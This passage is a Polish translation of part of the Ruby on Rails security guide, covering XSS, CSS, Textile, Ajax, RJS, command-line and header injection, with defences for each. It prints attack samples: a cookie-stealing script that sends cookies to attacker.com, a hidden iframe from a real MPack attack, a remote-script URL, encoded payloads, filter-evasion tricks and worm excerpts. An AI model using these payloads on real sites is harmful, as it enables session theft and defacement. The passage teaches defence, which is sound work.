Większość przykładów na XSS po prostu wyświetla okno ostrzegawcze (alert box),
ale jego możliwości są dużo bardziej groźne. XSS może wykraść cookies, przechwytywać sesje; przekierowywać ofiary do fałszywej strony internetowej, wyświetlać reklamy na korzyść atakującego, zmieniać elementy na stronie internetowej aby uzyskać poufne informacje lub instalować złośliwe oprogramowanie poprzez luki w przeglądarce internetowej.</p></div>
<div class="paragraph"><p>W drugiej połowie 2007 r. było 88 zgłoszonych usterek w Mozilli, 22 w Safari,
18 w IE, a 12 w Operze. W
<a href="http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf">Symantec
Global Internet Security threat report</a> także udokumentowano 239 usterek we
wtyczkach do przeglądarek w ciągu ostatnich sześciu miesięcy 2007 roku.
<a href="http://pandalabs.pandasecurity.com/archive/MPack-uncovered_2100_.aspx">MPack</a>
jest bardzo aktywnie rozwijanym i aktualnym frameworkiem do przeprowadzania
ataków, który wykorzystuje te luki. Dla hakerów, wizja wykorzystania luk
podatnych na ataki typu SQL Injection we frameworkach aplikacji internetowych
i wprowadzenie złośliwego kodu w każdej kolumnie tabel tekstowych jest bardzo
kuszące. W kwietniu 2008 ponad 510.000 stron
<a href="http://www.0x000000.com/?i=556">zostało zhakowanych</a> w ten sposób.
Wśród nich znalazły się strony brytyjskiego rządu, ONZ i wiele innych
poważnych instytucji.</p></div>
<div class="paragraph"><p>Stosunkowo nowymi i niecodziennymi formami ataku są banery reklamowe. We
wcześniejszych miesiącach 2008 roku (artykuł pochodzi z listopada 2008 -
przyp. red.), złośliwy kod ukazał się w reklamach w formie baneru na
popularnych witrynach, takich jak MySpace i Excite (według
<a href="http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/">Trend
Micro</a>).</p></div>
<h4 id="_ataki_html_javascript_injection">8.3.2. Ataki HTML/JavaScript Injection</h4>
<div class="paragraph"><p>Najczęściej wykorzystywanym językiem dla XSS jest oczywiście najbardziej
popularny język wykonywany po stronie klienta - JavaScript, często w
połączeniu z HTML. <span style="background-color: #fffcdb;">Czyszczenie danych wprowadzanych przez użytkownika jest niezbędne</span>.</p></div>
<div class="paragraph"><p>Oto najprostszy test, aby sprawdzić XSS:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;script&gt;</span></span>alert('Hello');<span style="font-weight: bold"><span style="color: #0000FF">&lt;/script&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Ten kod JavaScript po prostu wyświetli ostrzeżenie. Kolejne przykłady robią dokładnie to samo, tylko w bardzo nietypowych miejscach:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;img</span></span> <span style="color: #009900">src</span><span style="color: #990000">=</span><span style="color: #FF0000">"javascript:alert('Hello')"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span>
<span style="font-weight: bold"><span style="color: #0000FF">&lt;table</span></span> <span style="color: #009900">background</span><span style="color: #990000">=</span><span style="color: #FF0000">"javascript:alert('Hello')"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span></tt></pre></div></div>
<h5 id="_kradzie_cookie">Kradzież cookie</h5>
<div class="paragraph"><p>Te przykłady, jak na razie nie robią żadnej szkody, więc zobaczmy w jaki
sposób atakujący może wykraść cookies użytkownika (i tym samym przejąć jego
sesję). W JavaScript można użyć właściwość <tt>document.cookie</tt> do odczytu i zapisu
cookies. JavaScript egzekwuje zasadę tożsamego pochodzenia, co oznacza, że
skrypt z jednej domeny nie może uzyskać dostępu do cookies z innej domeny. We
właściwości <tt>document.cookie</tt> przechowywane jest cookie pochodzące z danego
serwera WWW. Jednakże, możesz odczytywać i zapisywać tą wartość, jeśli
umieścisz kod bezpośrednio w dokumencie HTML (jak to się dzieje w XSS).
Spróbuje umieścić poniższy kot gdziekolwiek na swojej stronie w celu
wyświetlenia własnych cookies na stronie wyników:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;script&gt;</span></span>document.write(document.cookie);<span style="font-weight: bold"><span style="color: #0000FF">&lt;/script&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Dla atakujący, oczywiście, nie jest to przydatne, ponieważ ofiara zobaczy
swoje własne cookie. W następnym przykładzie spróbujemy załadować obrazek z
adresu <a href="http://www.attacker.com/">http://www.attacker.com/</a> oraz cookie. Oczywiście ten adres nie istnieje, więc przeglądarka nic nie wyświetli. Ale atakujący może dokonać przeglądu raportu dostępu do jego serwera, żeby sprawdzić cookie ofiar.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;script&gt;</span></span>document.write('<span style="font-weight: bold"><span style="color: #0000FF">&lt;img</span></span> <span style="color: #009900">src</span><span style="color: #990000">=</span><span style="color: #FF0000">"http://www.attacker.com/' + document.cookie + '"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span>');<span style="font-weight: bold"><span style="color: #0000FF">&lt;/script&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Raport na <tt>www.attacker.com</tt> będzie wyglądać tak:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2</tt></pre></div></div>
<div class="paragraph"><p>Możesz zmniejszyć te ataki (w sposób oczywisty) poprzez dodanie flagi
<a href="http://dev.rubyonrails.org/ticket/8895">httpOnly</a> cookies, żeby
<tt>document.cookie</tt> nie mógł być odczytany przez JavaScript. Cookies <tt>httpOnly</tt> mogą być używane pod IE v6.SP1, Firefoxoxem v2.0.0.5 i Operą 9.5. Safari nadal ignoruje tą opcję. Ale w innych, starszych przeglądarkach (np. WebTV i IE 5.5 na Macu) może to powodować problemy z ładowaniem się stron. Ostrzegamy, że pliki cookie <a href="http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/">nadal będą widoczne przy użyciu technologii Ajax</a>.</p></div>
<h5 id="_atak_typu_defacement">Atak typu Defacement</h5>
<div class="paragraph"><p>Poprzez atak typu defacement (zniszczenie, zeszpecenie) atakujący może zrobić
wiele rzeczy, na przykład przedstawiać fałszywe informacje lub wabić ofiary na
swoją stronę internetową, żeby wykraść cookies, dane logowania lub innych
wrażliwe informacje. Najbardziej popularnym sposobem jest wstawienie kodu z
zewnętrznych źródeł przez <tt>iframe</tt>:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;iframe</span></span> <span style="color: #009900">name</span><span style="color: #990000">=</span><span style="color: #FF0000">"StatPage"</span> <span style="color: #009900">src</span><span style="color: #990000">=</span><span style="color: #FF0000">"http://58.xx.xxx.xxx"</span> <span style="color: #009900">width</span><span style="color: #990000">=</span><span style="color: #009900">5</span> <span style="color: #009900">height</span><span style="color: #990000">=</span><span style="color: #009900">5</span> <span style="color: #009900">style</span><span style="color: #990000">=</span><span style="color: #FF0000">"display:none"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;&lt;/iframe&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Powyższy kod załaduje arbitralny kod HTML i/lub JavaScript z zewnętrznego
źródła i osadzi go jako część witryny. Ten kod pochodzi z
<a href="http://www.symantec.com/enterprise/security_response/weblog/2007/06/italy_under_attack_mpack_gang.html">rzeczywistego
ataku</a> prawdziwych włoskich stron przy użyciu <a href="http://isc.sans.org/diary.html?storyid=3015">frameworku ataku MPack</a>. MPack próbuje zainstalować złośliwe oprogramowanie poprzez luki w przeglądarce internetowej - jest bardzo skuteczny, 50% ataków kończy się sukcesem.</p></div>
<div class="paragraph"><p>Bardziej specjalistyczne ataki mogą zakrywać całą stronę internetową lub wyświetlać formularz logowania, który wygląda tak samo jak oryginalny, lecz przekazuje nazwę użytkownika i hasło na stronę atakującego. Może też używać CSS i/lub JavaScript do ukrycia ważnych linków w aplikacji internetowej i wyświetlać inne, który przekierowują do fałszywej strony internetowej.</p></div>
<div class="paragraph"><p>Odbite (ang. reflectd) ataki typu injection to te, w których treść nie jest od
razu przedstawiana ofierze, ale dołączana do adresu URL. Zwłaszcza formularze
wyszukiwania często pomijają czyszczenie danych wejściowych.
Następujący link przedstawiał stronę, która twierdziła, że "George Bush powołał 9-letniego chłopca na przewodniczącego ...":</p></div>
<div class="literalblock">
<div class="content">
<pre><tt>http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode=1--&gt;
  &lt;script src=http://www.securitylab.ru/test/sc.js&gt;&lt;/script&gt;&lt;!--</tt></pre>
</div></div>
<h5 id="_sposoby_ochrony_3">Sposoby ochrony</h5>
<div class="paragraph"><p><span style="background-color: #fffcdb;">Bardzo ważne jest filtrowanie danych wejściowych,
ale równie ważne jest jego cytowanie (ang. escaping) w aplikacjach internetowych</span>.</p></div>
<div class="paragraph"><p>W szczególności dla XSS, ważne jest, aby stosować <span style="background-color: #fffcdb;">białą listę filtrowania zamiast czarnej</span>. Biała lista określa dozwolone wartości w przeciwieństwie do wartości niedozwolonych. Czarne listy nigdy nie są kompletne.</p></div>
<div class="paragraph"><p>Wyobraź sobie, że czarna lista usuwa <tt>script</tt> z wejścia użytkownika. Teraz
atakujący wprowadza <tt>&lt;scrscriptipt&gt;</tt>, a po przefiltrowaniu pozostaje
<tt>&lt;script&gt;</tt>. Wcześniejsze wersje Railsów używały czarnej listy w metodzie
<tt>strip_tags()</tt>, <tt>strip_links()</tt> i <tt>sanitize()</tt>. Więc niestety tego typu atak był możliwy:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>strip_tags<span style="color: #990000">(</span><span style="color: #FF0000">"some&lt;&lt;b&gt;script&gt;alert('hello')&lt;&lt;/b&gt;/script&gt;"</span><span style="color: #990000">)</span></tt></pre></div></div>
<div class="paragraph"><p>Metoda ta zwracała <tt>some&lt;script&gt;alert('hello')&lt;/script&gt;</tt>, co sprawiało, że atak zadziałał.
To jest powód dla którego byłem za wprowadzeniem białych list przy
aktualizacji metody <tt>sanitize()</tt> w Railsach 2.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>tags <span style="color: #990000">=</span> <span style="color: #990000">%</span>w<span style="color: #990000">(</span>a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p<span style="color: #990000">)</span>
s <span style="color: #990000">=</span> sanitize<span style="color: #990000">(</span>user_input<span style="color: #990000">,</span> <span style="color: #990000">:</span>tags <span style="color: #990000">=&gt;</span> tags<span style="color: #990000">,</span> <span style="color: #990000">:</span>attributes <span style="color: #990000">=&gt;</span> <span style="color: #990000">%</span>w<span style="color: #990000">(</span>href title<span style="color: #990000">))</span></tt></pre></div></div>
<div class="paragraph"><p>Pozwala to tylko na używanie wymienionych tagów i odwala dobrą robotę,
nawet przeciw wszelkiego rodzaju sztuczkom i zniekształconym tagom.</p></div>
<div class="paragraph"><p>W drugim etapie, <span style="background-color: #fffcdb;">dobrą praktyką jest cytowanie wszystkich danych
wyjściowych aplikacji,</span> zwłaszcza gdy ponownie wyświetlane są dane wprowadzone
przez użytkownika, które nie zostały przefiltrowane (jak we wcześniej
wspomnianym przykładzie formularza wyszukiwania). <span style="background-color: #fffcdb;">Używaj metody
<tt>escapeHTML()</tt> (lub jej aliasu <tt>h()</tt>)</span> żeby zastąpić znaki wejścia HTML
&amp;,",&lt;,&gt; przez ich nieinterpretowane reprezentacje w formacie HTML (<tt>&amp;amp;</tt>,
<tt>&amp;quot;</tt>, <tt>&amp;lt</tt>; oraz <tt>&amp;gt;</tt>). Jednak może się zdarzyć, że
programista zapomni ich użyć, więc <span style="background-color: #fffcdb;">zaleca się korzystanie z
<a href="http://safe-erb.rubyforge.org/svn/plugins/safe_erb/">wtyczki SafeErb</a></span>. SafeErb
przypomina o cytowaniu ciągów znaków pochodzących z zewnętrznych źródeł.</p></div>
<h5 id="_zaciemnianie_ang_obfuscation_i_ataki_z_wykorzystaniem_kodowania_znak_w">Zaciemnianie (ang. obfuscation) i ataki z wykorzystaniem kodowania znaków</h5>
<div class="paragraph"><p>Ruch w sieci opiera się głównie na ograniczonym zachodnim alfabecie, więc nowe
kodowanie znaków, np. UTF-8, pojawiły się, w celu przekazywania znaków
występujących w innych językach. Ale jest to również zagrożenie dla aplikacji
internetowych, ponieważ złośliwy kod może być ukryty w różnych kodowaniach, z
którymi przeglądarka internetowa może sobie poradzić, a aplikacja internetowa
nie może. Oto ciąg znaków służący do ataku w kodowaniu UTF-8:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;IMG</span></span> <span style="color: #009900">SRC</span><span style="color: #990000">=</span><span style="color: #009900">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;</span>
  <span style="color: #009900">&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Ten kod spowoduje pojawienie się wyskakującego okno z komunikatem.
Będzie to jednak rozpoznane przez wyżej wspomniany filtr <tt>sanitize()</tt>.
Świetnym narzędziem do zaciemniania i zmiany kodowania ciągów znaków, a tym
samym "do poznania swojego wroga", jest
<a href="http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php">Hackvertor</a>.
Railsowa metoda <tt>sanitize()</tt> odwala dobrą robotę odpierając ataki z
wykorzystaniem zmiany kodowania znaków.</p></div>
<h4 id="_podziemne_przyk_ady">8.3.3. Podziemne przykłady</h4>
<div class="paragraph"><p>-- <em>Aby zrozumieć dzisiejsze ataki na aplikacje internetowe, najlepiej
spojrzeć na niektóre sposoby ataku w świecie rzeczywistym.</em></p></div>
<div class="paragraph"><p>Poniżej znajduje się wyciąg z <a href="http://groovin.net/stuff/yammer.txt">robaka</a>
<a href="http://www.symantec.com/security_response/writeup.jsp?docid=2006-061211-4111-99&amp;tabid=1">Js.Yamanner@m</a> Yahoo! Mail.
Ukazał się on 11 czerwca 2006 roku i był pierwszym robakiem w webowym
interfejsie mailowym:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;img</span></span> <span style="color: #009900">src</span><span style="color: #990000">=</span><span style="color: #009900">'http://us.i1.yimg.com/us.yimg.com/i/us/nt/ma/ma_mail_1.gif'</span>
  <span style="color: #009900">target</span><span style="color: #990000">=</span><span style="color: #FF0000">""</span><span style="color: #009900">onload</span><span style="color: #990000">=</span><span style="color: #FF0000">"var http_request = false;    var Email = '';</span>
<span style="color: #FF0000">  var IDList = '';   var CRumb = '';   function makeRequest(url, Func, Method,Param) { ...</span></tt></pre></div></div>
<div class="paragraph"><p>Robak wykorzystuje dziurę w filtrze HTML/JavaScript Yahoo. Zazwyczaj filtruje
on wszystkie atrybuty <tt>target</tt> oraz <tt>onload</tt> z tagów (ponieważ nie można
używać JavaScriptu). Filtr jest stosowany tylko raz, jednak w taki sposób, że
atrybuty <tt>onload</tt> z zainfekowanym kodem pozostają w miejscu. Jest to dobry przykład tego, że filtry tworzone za pomocą czarnych list nigdy nie są kompletne i dlaczego trudno jest pozwolić na HTML/JavaScript w aplikacji internetowej.</p></div>
<div class="paragraph"><p>Kolejnym przykładem robaka webmailowego jest Nduja, robak typu cross-domain
atakujący cztery włoskie usługi webmailowe. Więcej szczegółów oraz demonstracja wideo znajdują się na stronie <a href="http://rosario.valotta.googlepages.com/home">Rosario Valotta</a>. Oba webmailowe robaki mają na celu zbieranie adresów e-mail, czyli coś, za co haker może zarobić duże pieniądze.</p></div>
<div class="paragraph"><p>W grudniu 2006 roku, 34000 rzeczywistych nazw użytkownika i haseł zostało
skradzionych z
<a href="http://news.netcraft.com/archives/2006/10/27/myspace_accounts_compromised_by_phishers.html">MySpace
poprzez atak typu phishing</a>. Ideą ataku było stworzenie strony profilu o
nazwie "login_home_index_html", przez co adres wyglądał bardzo przekonująco.
Specjalnie spreparowany HTML i CSS zostały użyty w celu ukrycia prawdziwej
treści ze strony MySpace i zamiast tego wyświetlany był własny formularz logowania.</p></div>
<div class="paragraph"><p>Robak Samy z MySpace zostanie omówiony w sekcji o atakach typu CSS injection.</p></div>
<h3 id="_atak_typu_css_injection">8.4. Atak typu CSS Injection</h3>
<div class="paragraph"><p>-- <em>Atak typu CSS injection w rzeczywistości jest atakiem typu JavaScript
injection, ponieważ niektóre przeglądarki (IE, niektóre wersje Safari i inne)
umożliwiają obsługę JavaScript w CSS. Dobrze się zastanów zanim pozwolisz na niestandardowe CSS w twojej aplikacji internetowej.</em></p></div>
<div class="paragraph"><p>Atak typu CSS injection można wytłumaczyć na przykładzie znanego robaka -  <a href="http://namb.la/popular/tech.html">MySpace Samy</a>. Ten robak automatycznie zaprasza do znajomych Sam’iego (atakującego), po prostu odwiedzając jego profil. W ciągu kilku godzin miał ponad 1 milion zaproszeń do znajomych, generując tak dużo ruchu na MySpace, że witryna przestała działać. Poniżej znajduje się techniczne wyjaśnienie działania robaka.</p></div>
<div class="paragraph"><p>MySpace blokuje wiele tagów, jednak pozwala na używanie CSS. Więc autor robaka umieścił JavaScript w CSS w taki sposób:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;div</span></span> <span style="color: #009900">style</span><span style="color: #990000">=</span><span style="color: #FF0000">"background:url('javascript:alert(1)')"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Tak więc kod umieszczany jest w atrybucie <tt>style</tt>. W kodzie nie można jednak użyć
cudzysłowów, ponieważ pojedyncze i podwójne cudzysłowy zostały już
wykorzystane. Ale JavaScript pozwala wykorzystywać przydatną funkcję <tt>eval()</tt>, która wykonuje każdy ciąg jako kod.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;div</span></span> <span style="color: #009900">id</span><span style="color: #990000">=</span><span style="color: #FF0000">"mycode"</span> <span style="color: #009900">expr</span><span style="color: #990000">=</span><span style="color: #FF0000">"alert('hah!')"</span> <span style="color: #009900">style</span><span style="color: #990000">=</span><span style="color: #FF0000">"background:url('javascript:eval(document.all.mycode.expr)')"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Funkcja <tt>eval()</tt> jest koszmarem dla czarnych list filtrów wejścia, gdyż
pozwala atrybutowi <tt>style</tt> ukryć słowo <tt>innerHTML</tt>:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>alert(eval('document.body.inne' + 'rHTML'));</tt></pre></div></div>
<div class="paragraph"><p>Kolejnym problemem w MySpace było filtrowanie słowa <tt>javascript</tt>, więc autor użył <tt>java&lt;NEWLINE&gt;script</tt> aby obejść ten problem:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">&lt;div</span></span> <span style="color: #009900">id</span><span style="color: #990000">=</span><span style="color: #FF0000">"mycode"</span> <span style="color: #009900">expr</span><span style="color: #990000">=</span><span style="color: #FF0000">"alert('hah!')"</span> <span style="color: #009900">style</span><span style="color: #990000">=</span><span style="color: #FF0000">"background:url('java↵ script:eval(document.all.mycode.expr)')"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span></tt></pre></div></div>
<div class="paragraph"><p>Innym problemem dla autora robaka były tokeny bezpieczeństwa CSRF. Bez nich nie mógłby zapraszać znajomych przez metodę POST. Obszedł to, wysyłając żądanie GET do strony zaraz przed dodaniem użytkownika i parsując wyniki dla tokena CSRF.</p></div>
<div class="paragraph"><p>W końcu stworzył 4 KB robaka, którego wpuścił do strony swojego profilu.</p></div>
<div class="paragraph"><p>Wartość <a href="http://www.securiteam.com/securitynews/5LP051FHPE.html">moz-binding</a> CSS okazała się być innym sposobem na wprowadzanie JavaScript do CSS w przeglądarkach opartych na Gecko (na przykład Firefox).</p></div>
<h4 id="_sposoby_ochrony_4">8.4.1. Sposoby ochrony</h4>
<div class="paragraph"><p>Ten przykład, ponownie pokazał, że filtr na podstawie czarnej listy nigdy nie
jest kompletny. Edytowalne CSS w aplikacjach internetowych jest dość rzadką
funkcją, jednak nie obawiam się stosować białych list do filtrowania CSS. <span style="background-color: #fffcdb;">Jeśli chcesz zezwolić na niestandardowe kolory lub obrazek, możesz pozwolić użytkownikowi je wybrać i tworzyć CSS w aplikacji internetowej</span>. Użyj Railsowej metody <tt>sanitize()</tt> jako modelu dla białej listy filtrowania CSS, jeśli naprawdę jej potrzebujesz.</p></div>
<h3 id="_atak_typu_textile_injection">8.5. Atak typu Textile Injection</h3>
<div class="paragraph"><p>-- <em>Jeśli chcesz zapewnić formatowanie tekstu inne niż HTML (ze względu na bezpieczeństwo), powinieneś użyć języka mark-up, który jest przekształcany na HTML po stronie serwera. <a href="http://whytheluckystiff.net/ruby/redcloth/">RedCloth</a> jest takim język dla Ruby, ale bez stosowania środków ostrożności, jest również podatny na XSS.</em></p></div>
<div class="paragraph"><p>Na przykład, RedCloth tłumaczy <tt>_test_</tt> na <tt>&lt;em&gt;test&lt;em&gt;</tt>, co oznacza
kursywę. Jednak, aż do wersji 3.0.4, był podatny na XSS. Pobierz
<a href="http://www.redcloth.org">nowszą wersje 4</a>, w której usunięto poważne
błędy. Jednak nawet ta wersja posiada <a href="http://www.rorsecurity.info/journal/2008/10/13/new-redcloth-security.html">kilka błędów bezpieczeństwa</a>, więc sposoby ochrony nadal obowiązują. Oto przykład dla wersji 3.0.4:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="color: #990000">&gt;&gt;</span> RedCloth<span style="color: #990000">.</span>new<span style="color: #990000">(</span><span style="color: #FF0000">'&lt;script&gt;alert(1)&lt;/script&gt;'</span><span style="color: #990000">).</span>to_html
<span style="color: #990000">=&gt;</span> <span style="color: #FF0000">"&lt;script&gt;alert(1)&lt;/script&gt;"</span></tt></pre></div></div>
<div class="paragraph"><p>Użyj opcji <tt>:filter_html</tt> żeby usunąć kod HTML, który nie został stworzony przez procesor textile.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt><span style="color: #990000">&gt;&gt;</span> RedCloth<span style="color: #990000">.</span>new<span style="color: #990000">(</span><span style="color: #FF0000">'&lt;script&gt;alert(1)&lt;/script&gt;'</span><span style="color: #990000">,</span> <span style="color: #990000">[:</span>filter_html<span style="color: #990000">]).</span>to_html
<span style="color: #990000">=&gt;</span> <span style="color: #FF0000">"alert(1)"</span></tt></pre></div></div>
<div class="paragraph"><p>Ta metoda nie przefiltruje całego kodu HTML - kilka tagów zostanie pominiętych
(ze względów konstrukcyjnych), na przykład <tt>&lt;a&gt;</tt>:</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>&gt;&gt; RedCloth.new("<span style="font-weight: bold"><span style="color: #0000FF">&lt;a</span></span> <span style="color: #009900">href</span><span style="color: #990000">=</span><span style="color: #009900">'javascript:alert(1)'</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span>hello<span style="font-weight: bold"><span style="color: #0000FF">&lt;/a&gt;</span></span>", [:filter_html]).to_html
=&gt; "<span style="font-weight: bold"><span style="color: #0000FF">&lt;p&gt;&lt;a</span></span> <span style="color: #009900">href</span><span style="color: #990000">=</span><span style="color: #FF0000">"javascript:alert(1)"</span><span style="font-weight: bold"><span style="color: #0000FF">&gt;</span></span>hello<span style="font-weight: bold"><span style="color: #0000FF">&lt;/a&gt;&lt;/p&gt;</span></span>"</tt></pre></div></div>
<h4 id="_sposoby_ochrony_5">8.5.1. Sposoby ochrony</h4>
<div class="paragraph"><p>Zaleca się <span style="background-color: #fffcdb;">korzystanie z  RedCloth w połączeniu z białą listą do
filtrowania wejścia,</span> jak zostało to opisane w sposobach ochrony przeciwko XSS.</p></div>
<h3 id="_atak_typu_ajax_injection">8.6. Atak typu Ajax Injection</h3>
<div class="paragraph"><p>-- <em>Środki ostrożności, podjęte dla Ajaxa, są takie same jak te dla
"normalnych" technologii. Istnieje przynajmniej jeden wyjątek: cytowanie wyjścia musi nastąpić już w kontrolerze, jeżeli akcja nie renderuje widoku.</em></p></div>
<div class="paragraph"><p>Jeśli używasz
<a href="http://dev.rubyonrails.org/browser/plugins/in_place_editing">wtyczki
in_place_editor</a>, lub akcji, które zwracają ciąg znaków, a nie renderujesz
widoku, <span style="background-color: #fffcdb;">musisz cytować wartości zwracane w akcji</span>. W przeciwnym
razie, jeśli zwracana wartość zawiera ciąg XSS, złośliwy kod będzie wykonywany
po powrocie do przeglądarki. Cytuj wszystkie dane wejściowe używając metody
<tt>h()</tt>.</p></div>
<h3 id="_atak_typu_rjs_injection">8.7. Atak typu RJS Injection</h3>
<div class="paragraph"><p>-- <em>Nie zapomnij o cytowaniu w szablonach JavaScript (RJS).</em></p></div>
<div class="paragraph"><p>API RJS generuje bloki kodu w oparciu o kod Ruby, co pozwala manipulować
widokiem lub częścię widok po stronie serwera. <span style="background-color: #fffcdb;">Jeśli zezwalasz na
wyświetlanie danych wprowadzonych przez użytkownika w szablonach RJS, użyj
cytowania korzystając z <tt>escape_javascript()</tt> w funkcjach JavaScript i <tt>h()</tt> w HTML</span>.
W przeciwnym wypadku atakujący może wykonać arbitralny kod JavaScript.</p></div>
<h3 id="_atak_typu_command_line_injection">8.8. Atak typu Command Line Injection</h3>
<div class="paragraph"><p>-- <em>Używaj parametrów wiersza polecenia dostarczanych przez użytkownika z ostrożnością.</em></p></div>
<div class="paragraph"><p>Jeśli twoja aplikacja musi wykonywać polecenia systemu operacyjnego, istnieje
do tego kilka metod w Ruby: <tt>exec(command)</tt>, <tt>syscall(command)</tt>,
<tt>system(command)</tt> oraz <tt>`command`</tt>. Będziesz musiał być szczególnie ostrożny
z tymi funkcjami, jeżeli użytkownik może wprowadzić całą komendę lub jej
część. Dzieje się tak, ponieważ w większości powłok, możesz wykonywać kolejne polecenie na końcu pierwszego łącząc je średnikiem (;) lub pionową kreska (|).</p></div>
<div class="paragraph"><p>Jako ochrony <span style="background-color: #fffcdb;">użyj metody <tt>system(command, params)</tt>, która bezpiecznie przekazuje parametry linii poleceń</span>.</p></div>
<div class="listingblock">
<div class="content"><!-- Generator: GNU source-highlight 2.11
by Lorenzo Bettini
http://www.lorenzobettini.it
http://www.gnu.org/software/src-highlite -->
<pre><tt>system<span style="color: #990000">(</span><span style="color: #FF0000">"/bin/echo"</span><span style="color: #990000">,</span><span style="color: #FF0000">"hello; rm *"</span><span style="color: #990000">)</span>
<span style="font-style: italic"><span style="color: #9A1900"># wyświetla "hello; rm *" i nie powoduje usunięcia plików</span></span></tt></pre></div></div>
<h3 id="_atak_typu_header_injection">8.9. Atak typu Header Injection</h3>
<div class="paragraph"><p>-- <em>Nagłówki HTTP są generowane dynamicznie i przy pewnych okolicznościach
dane wprowadzone przez użytkownika mogą zostać zaatakowane. Może to prowadzić do
fałszywego przekierowania, XSS lub rozszczepieniu odpowiedzi HTTP.</em></p></div>
<div class="paragraph"><p>Nagłówki żądań HTTP zawierają między innymi <tt>Referer</tt>, <tt>User-Agent</tt>
(oprogramowanie klienta) i pole cookie. Nagłówki odpowiedzi mają na przykład
kod stanu, cookie i lokalizację (przekierowanie docelowego adresu URL).
